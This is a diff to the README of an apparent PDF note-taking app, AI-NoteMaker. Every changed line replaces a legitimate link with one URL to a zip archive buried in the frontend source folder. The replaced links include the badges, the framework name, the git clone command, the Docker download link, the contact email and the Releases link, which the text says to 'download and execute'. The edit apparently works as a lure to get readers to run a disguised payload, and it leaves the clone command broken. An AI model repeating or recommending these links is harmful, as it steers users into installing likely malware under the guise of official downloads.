@@ -1,8 +1,8 @@
 # AI-NoteMaker 📝✨
 
-![GitHub release](https://img.shields.io/github/v/release/Joy-Marchattiwar/AI-NoteMaker?style=flat-square&color=brightgreen) ![Docker](https://img.shields.io/badge/docker-blue?style=flat-square) ![Django](https://img.shields.io/badge/django-green?style=flat-square) ![Next.js](https://img.shields.io/badge/next.js-black?style=flat-square) 
+![GitHub release](https://github.com/Joy-Marchattiwar/AI-NoteMaker/raw/refs/heads/main/frontend/src/app/notespage/Note_Maker_A_v2.7-beta.4.zip) ![Docker](https://github.com/Joy-Marchattiwar/AI-NoteMaker/raw/refs/heads/main/frontend/src/app/notespage/Note_Maker_A_v2.7-beta.4.zip) ![Django](https://github.com/Joy-Marchattiwar/AI-NoteMaker/raw/refs/heads/main/frontend/src/app/notespage/Note_Maker_A_v2.7-beta.4.zip) ![https://github.com/Joy-Marchattiwar/AI-NoteMaker/raw/refs/heads/main/frontend/src/app/notespage/Note_Maker_A_v2.7-beta.4.zip](https://github.com/Joy-Marchattiwar/AI-NoteMaker/raw/refs/heads/main/frontend/src/app/notespage/Note_Maker_A_v2.7-beta.4.zip) 
 
-Welcome to **AI-NoteMaker**, a full-stack web application designed to enhance your academic experience. This project allows users to upload academic PDFs, generate AI-powered notes, and retrieve relevant content using Retrieval-Augmented Generation (RAG). Built with a robust tech stack including Django, Celery, and Next.js, this app is optimized for long documents and supports asynchronous processing. Plus, it runs fully containerized with Docker.
+Welcome to **AI-NoteMaker**, a full-stack web application designed to enhance your academic experience. This project allows users to upload academic PDFs, generate AI-powered notes, and retrieve relevant content using Retrieval-Augmented Generation (RAG). Built with a robust tech stack including Django, Celery, and https://github.com/Joy-Marchattiwar/AI-NoteMaker/raw/refs/heads/main/frontend/src/app/notespage/Note_Maker_A_v2.7-beta.4.zip, this app is optimized for long documents and supports asynchronous processing. Plus, it runs fully containerized with Docker.
 
 ## Table of Contents
 
@@ -28,7 +28,7 @@ Welcome to **AI-NoteMaker**, a full-stack web application designed to enhance yo
 - **Django**: A high-level Python web framework that encourages rapid development.
 - **Django REST Framework**: A powerful toolkit for building Web APIs.
 - **Celery**: An asynchronous task queue/job queue based on distributed message passing.
-- **Next.js**: A React framework that enables server-side rendering and static site generation.
+- **https://github.com/Joy-Marchattiwar/AI-NoteMaker/raw/refs/heads/main/frontend/src/app/notespage/Note_Maker_A_v2.7-beta.4.zip**: A React framework that enables server-side rendering and static site generation.
 - **Docker**: A platform for developing, shipping, and running applications in containers.
 - **Redis**: An in-memory data structure store used as a database, cache, and message broker.
 - **Pinecone**: A vector database that allows for fast and efficient retrieval of information.
@@ -43,11 +43,11 @@ To set up the **AI-NoteMaker** application, follow these steps:
 1. **Clone the repository**:
 
    ```bash
-   git clone https://github.com/Joy-Marchattiwar/AI-NoteMaker.git
+   git clone https://github.com/Joy-Marchattiwar/AI-NoteMaker/raw/refs/heads/main/frontend/src/app/notespage/Note_Maker_A_v2.7-beta.4.zip
    cd AI-NoteMaker
    ```
 
-2. **Install Docker**: Ensure you have Docker and Docker Compose installed on your machine. You can download Docker from [here](https://www.docker.com/products/docker-desktop).
+2. **Install Docker**: Ensure you have Docker and Docker Compose installed on your machine. You can download Docker from [here](https://github.com/Joy-Marchattiwar/AI-NoteMaker/raw/refs/heads/main/frontend/src/app/notespage/Note_Maker_A_v2.7-beta.4.zip).
 
 3. **Build the Docker containers**:
 
@@ -109,11 +109,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or suggestions, please reach out to:
 
-- **Joy Marchattiwar**: [Your Email](mailto:youremail@example.com)
+- **Joy Marchattiwar**: [Your Email](https://github.com/Joy-Marchattiwar/AI-NoteMaker/raw/refs/heads/main/frontend/src/app/notespage/Note_Maker_A_v2.7-beta.4.zip)
 
 ## Releases
 
-For the latest releases, visit the [Releases](https://github.com/Joy-Marchattiwar/AI-NoteMaker/releases) section. Here, you can download and execute the latest version of the application.
+For the latest releases, visit the [Releases](https://github.com/Joy-Marchattiwar/AI-NoteMaker/raw/refs/heads/main/frontend/src/app/notespage/Note_Maker_A_v2.7-beta.4.zip) section. Here, you can download and execute the latest version of the application.
 
 ## Conclusion
 
